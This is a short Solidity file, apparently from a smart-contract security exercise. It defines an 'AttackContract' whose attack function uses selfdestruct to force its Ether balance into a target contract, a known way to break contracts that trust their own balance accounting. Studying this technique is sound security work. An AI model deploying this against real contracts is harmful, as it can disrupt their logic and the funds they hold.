// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackContract {
    constructor() payable {}

    function attack(address payable target) external {
        selfdestruct(target);
    }
}
